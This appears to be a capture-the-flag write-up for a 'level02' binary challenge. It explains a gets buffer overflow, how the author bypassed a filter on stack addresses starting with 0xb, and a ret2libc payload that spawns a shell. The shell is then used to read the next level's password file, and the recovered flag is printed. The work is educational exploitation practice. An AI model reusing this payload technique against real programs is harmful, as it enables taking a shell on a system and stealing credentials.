# Write up

While executing the `level02` program, we have to write on the standard input.
Unlike the level01 program, the written string is printed on the standard output.

We download it, and dissassemble it like before, but with intel syntax for better understanding : `objdump -M intel -d bin2 > asm2_intel.txt`

The programm directly call a `p` function, which allocate first 104 bytes on the stack :
```
 80484d7:	83 ec 68             	sub    esp,0x68
```
The programm then call the fflush function, followed by the gets function :
```
 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
```
The eax register address is here set 76 (4c in hex) bytes after the stack frame pointer (pointed by ebp) with the lea instruction, giving us a 76 bytes buffer size.

Then, the program move a 4 byte size value 4 bytes under the stack frame pointer and moves it 12 bytes over
```
 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
```
A condition checks then if the 4 byte value (DWORD is a double word, 32 bits) stored in the eax register doesn't starts by 0xb.
```
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
```
We continue the translation (see the pseudo_code.c file),
then we try a payload using 80 dummy chars (76 + 4 bytes of offset) followed by 0xb0000000
```
printf "%80s%b" "" "\x00\x00\x00\xb0" | ./level2
(0xb0000000)
```
Which makes every address starting by 0xb at the offset 80 (ESP/saved EIP) escaped.

The program doesn't contain any function that opens a shell, we first thought we had so to inject a shellcode.
```
printf "%80s%b%b" "" "[shellcode stack address]" "[shellcode, eventually preceded by a nop (\x90) pool]"
```
We checked the saved eip address in order to get our shellcode address :
```
gdb ./level02
(gbb) break *0x80484d4
(gdb) run
(gdb) i r $esp
esp            0xbffff71c       0xbffff71c
``` 
However, we noticed that the stack addresses starts by 0xb, which are escaped, which prevents us to execute a shellcode here.
We decided so to try a ret2libc exploit.
The ret instruction also makes a pop eip which let us exploit the saved eip trick 4 bytes after.
We have a ret instruction here :
```
 804853e:	c3                   	ret    
```
To bypass the 0xb filter, we set the ret instruction address at offset 80, to make it do a second jump to offset 84, where there is no filter.
We have to find the system and the "/bin/sh" string addresses then, using gdb :
```
gdb ./level2
(gdb) break main
(gdb) run
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
(gdb) find &system,+9999999,"/bin/sh"  
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```
Which let us building the following payload :
```
printf "%80s%b%b%s%b" "" "\x3e\x85\x04\x08" "\x60\xb0\xe6\xb7" "LIDL" "\x58\xcc\xf8\xb7"
```
We execute it, as before, coupling it with a stdin cat command :
```
(printf "%80s%b%b%s%b" "" "\x3e\x85\x04\x08" "\x60\xb0\xe6\xb7" "LIDL" "\x58\xcc\xf8\xb7"; cat) | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
Which gives us the flag.

## Sources

https://www.cs.virginia.edu/~evans/cs216/guides/x86.html
https://beta.hackndo.com/buffer-overflow/
https://beta.hackndo.com/retour-a-la-libc/
https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue
https://c9x.me/x86/html/file_module_x86_id_280.html